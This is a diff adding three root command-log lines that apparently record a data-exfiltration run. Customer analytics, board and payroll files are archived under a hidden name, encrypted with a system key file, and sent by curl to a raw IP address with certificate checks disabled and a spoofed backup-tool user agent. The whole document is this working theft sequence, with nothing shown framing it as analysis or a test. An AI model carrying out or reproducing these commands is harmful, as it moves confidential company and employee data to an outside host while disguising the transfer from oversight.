@@ -1,0 +1,3 @@
+2026-02-13T11:09:12Z root 7z a -mx=0 /var/tmp/.cache.tz /data/export/customer_analytics_2026-02.csv /data/export/board_q1_draft.pptx /data/export/payroll_adjustments.xlsx
+2026-02-13T11:12:08Z root openssl enc -aes-256-cbc -salt -pbkdf2 -in /var/tmp/.cache.tz -out /var/tmp/.cache.tz.enc -pass file:/etc/backup_sync.key
+2026-02-13T11:17:45Z root curl --http1.1 -k -A 'Restic/0.16' --data-binary @/var/tmp/.cache.tz.enc https://103.166.185.200/upload
